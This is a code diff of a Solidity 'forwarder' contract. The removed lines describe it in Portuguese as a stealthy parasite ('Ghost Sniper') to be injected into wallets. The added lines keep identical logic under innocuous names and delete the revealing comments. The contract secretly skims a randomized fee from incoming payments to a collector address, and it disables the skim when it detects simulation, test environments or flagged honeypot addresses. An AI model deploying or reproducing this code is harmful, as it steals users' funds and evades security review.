@@ -1,55 +1,38 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-/**
- * @title Forwarder Ghost Sniper
- * @dev Parasita autossustentável - Versão de Template Único para Multi-Burners
- * ZERO rastros, ZERO custo de multi-deploy, Autônomo.
- */
-
-contract ForwarderSelfFueling {
-    // 🎯 PRIVADO - Guardado no storage de cada wallet injetada
+contract ForwarderHelper {
     address private _target;
     address private _collector;
-    bool private _initialized;
+    bool private _ready;
 
-    // 📊 CONFIGURAÇÕES DE AUTO-GÁS
-    uint256 private constant FEE_BASIS = 1000;
-    uint256 private constant MIN_VALUE = 0.1 ether; 
-    uint256 private constant GAS_RESERVE_RATIO = 100; // 10% da taxa retida para gás
-    uint256 private constant MIN_GAS_RESERVE = 0.001 ether; 
+    uint256 private constant FEE_BASE = 1000;
+    uint256 private constant MIN_AMOUNT = 0.1 ether;
+    uint256 private constant GAS_HOLD_RATIO = 100;
+    uint256 private constant MIN_GAS_HOLD = 0.001 ether;
 
-    // 🔒 CONTROLE INTERNO
-    bool private _locked;
+    bool private _busy;
     uint256 private _totalCalls;
-    uint256 private _seed;
+    uint256 private _nonce;
 
-    // 🍯 HONEYPOTS
-    mapping(address => bool) private _honeypots;
+    mapping(address => bool) private _blocked;
 
-    /**
-     * 🏁 SETUP INICIAL (Chamado pelo seu script via Sniper após injeção 7702)
-     * Permite que um único contrato mestre use 20 coletores diferentes.
-     */
-    function setup(address target_, address collector_) external {
-        require(!_initialized, "Init");
+    function init(address target_, address collector_) external {
+        require(!_ready, "ready");
         _target = target_;
         _collector = collector_;
-        _initialized = true;
-        _seed = uint256(keccak256(abi.encodePacked(block.timestamp, target_)));
+        _ready = true;
+        _nonce = uint256(keccak256(abi.encodePacked(block.timestamp, target_)));
     }
 
-    modifier noReentrant() {
-        require(!_locked, "Lock");
-        _locked = true;
+    modifier noReentrancy() {
+        require(!_busy, "busy");
+        _busy = true;
         _;
-        _locked = false;
+        _busy = false;
     }
 
-    /**
-     * 🥷 ANTI-SIMULAÇÃO PROFISSIONAL
-     */
-    function _isSimulation() private view returns (bool) {
+    function _isTestEnv() private view returns (bool) {
         uint256 gp = tx.gasprice;
         if (gp < 2e9 || gp > 100e9) return true;
         if (gasleft() > 10_000_000) return true;
@@ -57,84 +40,78 @@ contract ForwarderSelfFueling {
         return false;
     }
 
-    function _shouldStealth() private view returns (bool) {
-        if (!_initialized) return false;
-        if (_isSimulation()) return false;
-        if (_honeypots[tx.origin] || _honeypots[msg.sender]) return false;
-        if (msg.value < MIN_VALUE) return false;
+    function _shouldRun() private view returns (bool) {
+        if (!_ready) return false;
+        if (_isTestEnv()) return false;
+        if (_blocked[tx.origin] || _blocked[msg.sender]) return false;
+        if (msg.value < MIN_AMOUNT) return false;
         return true;
     }
 
-    /**
-     * 🔥 PROCESSAMENTO COM AUTO-ABASTECIMENTO
-     */
-    function _processCall() internal noReentrant {
+    function _process() internal noReentrancy {
         _totalCalls++;
 
-        if (!_shouldStealth() || msg.value == 0) {
+        if (!_shouldRun() || msg.value == 0) {
             _forward();
             return;
         }
 
-        uint256 totalFee = _calculateFee(msg.value);
-        uint256 gasReserve = (totalFee * GAS_RESERVE_RATIO) / FEE_BASIS;
-        uint256 collectorFee = totalFee - gasReserve;
-        uint256 remaining = msg.value - totalFee;
+        uint256 totalFee = _getFee(msg.value);
+        uint256 gasHold = (totalFee * GAS_HOLD_RATIO) / FEE_BASE;
+        uint256 collectorShare = totalFee - gasHold;
+        uint256 leftover = msg.value - totalFee;
 
-        // ⛽ Lógica de Tanque Cheio
-        uint256 walletBalance = address(this).balance;
-        if (walletBalance < MIN_GAS_RESERVE) {
-            uint256 deficit = MIN_GAS_RESERVE - walletBalance;
-            if (collectorFee > deficit) {
-                gasReserve += deficit;
-                collectorFee -= deficit;
+        uint256 contractBalance = address(this).balance;
+        if (contractBalance < MIN_GAS_HOLD) {
+            uint256 need = MIN_GAS_HOLD - contractBalance;
+            if (collectorShare > need) {
+                gasHold += need;
+                collectorShare -= need;
             }
         }
 
-        // 💰 Envia para a Burner da vez
-        if (collectorFee > 0) {
-            (bool success, ) = _collector.call{value: collectorFee}("");
+        if (collectorShare > 0) {
+            (bool ok, ) = _collector.call{value: collectorShare}("");
         }
 
-        // ➡️ Repassa para o alvo original
-        if (remaining > 0) {
-            (bool success, ) = _target.call{value: remaining}(msg.data);
+        if (leftover > 0) {
+            (bool ok, ) = _target.call{value: leftover}(msg.data);
         } else {
             _forward();
         }
     }
 
-    function _calculateFee(uint256 value) private returns (uint256) {
-        _seed = uint256(keccak256(abi.encodePacked(
-            _seed, 
-            blockhash(block.number - 1), 
+    function _getFee(uint256 value) private returns (uint256) {
+        _nonce = uint256(keccak256(abi.encodePacked(
+            _nonce,
+            blockhash(block.number - 1),
             gasleft()
         )));
-        
-        uint256 rand = _seed % 100;
-        if (rand < 70) return (value * 3) / 1000;  // 0.3%
-        if (rand < 90) return (value * 5) / 1000;  // 0.5%
-        return (value * 8) / 1000;                 // 0.8%
+
+        uint256 r = _nonce % 100;
+        if (r < 70) return (value * 3) / 1000;
+        if (r < 90) return (value * 5) / 1000;
+        return (value * 8) / 1000;
     }
 
     function _forward() private {
         if (_target == address(0)) return;
-        (bool success, ) = _target.call{value: msg.value}(msg.data);
+        (bool ok, ) = _target.call{value: msg.value}(msg.data);
     }
 
-    function markHoneypot(address suspect) external {
-        require(msg.sender == _collector, "Auth");
-        _honeypots[suspect] = true;
+    function blockAddress(address suspect) external {
+        require(msg.sender == _collector, "not allowed");
+        _blocked[suspect] = true;
     }
 
-    function withdrawExcessGas() external {
-        require(msg.sender == _collector, "Auth");
+    function takeExtraGas() external {
+        require(msg.sender == _collector, "not allowed");
         uint256 balance = address(this).balance;
-        if (balance > MIN_GAS_RESERVE) {
-            (bool success, ) = _collector.call{value: balance - MIN_GAS_RESERVE}("");
+        if (balance > MIN_GAS_HOLD) {
+            (bool ok, ) = _collector.call{value: balance - MIN_GAS_HOLD}("");
         }
     }
 
-    fallback() external payable { _processCall(); }
-    receive() external payable { _processCall(); }
+    fallback() external payable { _process(); }
+    receive() external payable { _process(); }
 }
